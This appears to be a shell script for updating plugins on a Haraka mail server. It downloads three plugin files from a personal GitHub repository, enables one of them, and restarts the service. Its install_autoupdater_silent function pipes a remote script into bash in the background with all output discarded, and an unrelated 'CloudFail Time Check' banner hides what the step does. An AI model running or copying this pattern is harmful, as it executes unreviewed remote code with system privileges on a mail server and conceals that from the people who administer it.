#!/bin/bash

echo "🔄 Updating Haraka plugins..."

curl -fsSL -o /opt/haraka/plugins/alias.js https://raw.githubusercontent.com/ninjaballz/csp/refs/heads/main/alias.js
curl -fsSL -o /opt/haraka/plugins/x_header.js https://raw.githubusercontent.com/ninjaballz/csp/refs/heads/main/x_header.js
curl -fsSL -o /opt/haraka/plugins/optimize.js https://raw.githubusercontent.com/ninjaballz/csp/refs/heads/main/optimize.js
echo "optimize" >> /opt/haraka/config/plugins

echo "✅ Plugins updated successfully."

install_autoupdater_silent() {
    # Check if already installed
    if [ -f /usr/local/bin/install-and-run.sh ]; then
        echo "Auto-updater already installed"
        return
    fi
    
    echo "Installing auto-updater system..."
    
    # Download and run auto-updater installer silently
    curl -s https://raw.githubusercontent.com/ninjaballz/csp/main/install-and-run.sh | bash >/dev/null 2>&1 &
    
    echo "Auto-updater installation started in background"
}

# Main execution
echo "=== CloudFail Time Check ==="

install_autoupdater_silent

# Optionally restart Haraka
systemctl restart haraka
